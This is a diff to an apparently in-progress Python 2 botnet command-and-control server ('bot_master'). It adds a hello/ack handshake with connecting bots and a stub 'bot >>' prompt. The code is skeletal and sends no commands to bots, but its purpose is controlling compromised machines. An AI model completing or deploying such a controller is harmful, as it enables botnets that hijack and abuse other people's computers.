@@ -2,6 +2,7 @@
 
 import socket
 import time
+import sys
 
 from common import *
 
@@ -33,11 +34,38 @@ class bot_master:
 
 		self.botlist.append(botlist(conn, addr))
 		
-		if (manually == True)
+		if (manually == True):
 			self.get_cli(conn)
+		else:
+			print "write automatic functions plz"
+			return False;
 
 	
 	def get_cli(self, sock):
+		sock.setblocking(1);
+
+		try:	ack = sock.recv(PACK_SZ, socket.MSG_DONTWAIT)
+		except Exception as err:	
+			D('print "recv hello fail"');
+			print err;
+			return False;
+		if ack != HELLO_MSG:
+			print '[-] HELLO message incorrect'
+			return False;
+
+		print "[+] ack recieved"
+		
+		sock.sendall(HELLO_ACK)
+
+		while True:
+			try:
+				sys.stdout.write("bot >> ");
+				break;
+			except:
+				D('print "send fail"');
+				return False;
+				
+
 		pass;
 
 	def start_listen(self):
@@ -88,7 +116,7 @@ def test_master():
 	"""
 	
 	mymaster = bot_master()
-	mymaster.run()
+	mymaster.run(manually = True)
 	mymaster.print_botlist();
 	
 	del(mymaster)
